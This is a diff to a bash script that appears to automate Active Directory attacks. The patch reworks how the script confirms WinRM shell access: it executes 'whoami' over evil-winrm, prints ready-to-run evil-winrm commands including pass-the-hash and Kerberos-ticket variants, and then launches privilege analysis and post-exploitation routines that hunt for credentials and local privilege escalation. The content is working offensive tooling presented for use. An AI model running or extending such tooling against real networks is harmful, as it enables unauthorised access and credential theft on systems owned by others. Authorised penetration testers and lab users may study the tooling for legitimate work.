@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.35.5"
+readonly VERSION="1.35.6"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -2637,37 +2637,49 @@ phase_winrm_dpapi() {
             echo "$w" | tee -a "$LOGFILE"
         fi
 
-        # Who is in 'Remote Management Users' (Administrators can WinRM too). Read
-        # once via LDAP and reused both to decide access and to show the list.
-        local rmu="" can_winrm=0
-        grep -qi 'Pwn3d' <<<"$w" && can_winrm=1
+        # Decide WinRM access by GROUND TRUTH, not by group membership. Being in
+        # 'Remote Management Users' is only a hint (over-reports — disabled WinRM,
+        # nested groups, regex false-matches), and nxc winrm is unreliable under
+        # Kerberos (prints neither [+] nor an error even when access exists). So we
+        # CONFIRM by executing `whoami` over evil-winrm: a real shell echoes our
+        # account. Group membership is read for display only, plus a clearly-labelled
+        # fallback when evil-winrm isn't installed and so we can't actually confirm.
+        local rmu="" can_winrm=0 confirmed=0
+        local u_re; u_re=$(printf '%s' "$USER" | sed 's/[][\.^$*+?(){}|]/\\&/g')
+        if grep -qiE 'WINRM.*\(Pwn3d!\)' <<<"$w"; then can_winrm=1; confirmed=1
+        elif have evil-winrm; then
+            local _wt; _wt=$(_winrm_exec 'whoami' 2>/dev/null | tr -d '\r')
+            if grep -qiF -- "${USER%\$}" <<<"$_wt" \
+               && ! grep -qiE 'Authorization|Access is denied|FailedToOpen|WinRM[A-Za-z]*Error|cannot' <<<"$_wt"; then
+                can_winrm=1; confirmed=1
+            fi
+        fi
+        [[ -n "${OWNED_ADMIN[${USER,,}]:-}" ]] && can_winrm=1
         if [[ "$CAP_LDAP" == "1" ]]; then
             rmu=$($NXC ldap "$DCT" "${args[@]}" -M group-mem -o GROUP="Remote Management Users" 2>/dev/null)
             printf '%s\n' "$rmu" >>"$LOGFILE"; printf '%s\n' "$rmu" >"$OUTDIR/winrm_users.txt"
-            local u_re; u_re=$(printf '%s' "$USER" | sed 's/[][\.^$*+?(){}|]/\\&/g')
-            grep -qiE "(\\\\|[[:space:]])${u_re}([[:space:]]|\$)" <<<"$rmu" && can_winrm=1
+            # Group fallback ONLY when we couldn't truly confirm (no evil-winrm).
+            if [[ "$confirmed" == "0" && "$can_winrm" == "0" ]] && ! have evil-winrm \
+               && grep -qiE "(\\\\|[[:space:]])${u_re}([[:space:]]|\$)" <<<"$rmu"; then
+                can_winrm=1
+            fi
         fi
-        [[ -n "${OWNED_ADMIN[${USER,,}]:-}" ]] && can_winrm=1   # admins can always WinRM
 
-        if [[ "$can_winrm" == "1" ]]; then
+        if [[ "$can_winrm" == "1" && "$confirmed" == "1" ]]; then
             loot "★ ${USER} has WinRM shell access!"
+        elif [[ "$can_winrm" == "1" ]]; then
+            warn "${USER} is in Remote Management Users (WinRM LIKELY) — could not confirm a shell; verify with the line below"
+        fi
+        if [[ "$can_winrm" == "1" ]]; then
             if [[ -n "$KERB_TICKET" ]]; then
                 ok "Shell:  KRB5CCNAME=$KERB_TICKET evil-winrm -i $DC_FQDN -r $DOMAIN"
             else
                 ok "Shell:  evil-winrm -i $DC_FQDN -u $USER $( [[ -n "$HASH" ]] && echo "-H $HASH" || echo "-p '<pass>'" )"
             fi
-            [[ "$winrm_err" == "1" ]] && info "(nxc's WinRM probe errored under Kerberos — access confirmed via group membership; use the evil-winrm line above)"
-            # Always try to read the token: analyze_privileges falls back to
-            # evil-winrm when nxc's winrm -x chokes (the Kerberos case), so we get
-            # whoami /priv + /groups even when winrm_err==1.
             analyze_privileges
-            # Then mine the shell for the next step (own-user creds + local privesc),
-            # which the admin-only nxc --dpapi can't reach. Read-only.
             _winrm_postex
-        elif [[ "$winrm_err" == "1" ]]; then
-            warn "WinRM probe errored (known nxc Kerberos bug) and ${USER} isn't in Remote Management Users → assume no WinRM"
         else
-            info "${USER} cannot WinRM (not Pwn3d, not in Remote Management Users)"
+            info "${USER} cannot WinRM (no confirmed shell; not Pwn3d / not in Remote Management Users)"
         fi
 
         if [[ "$CAP_LDAP" == "1" ]]; then
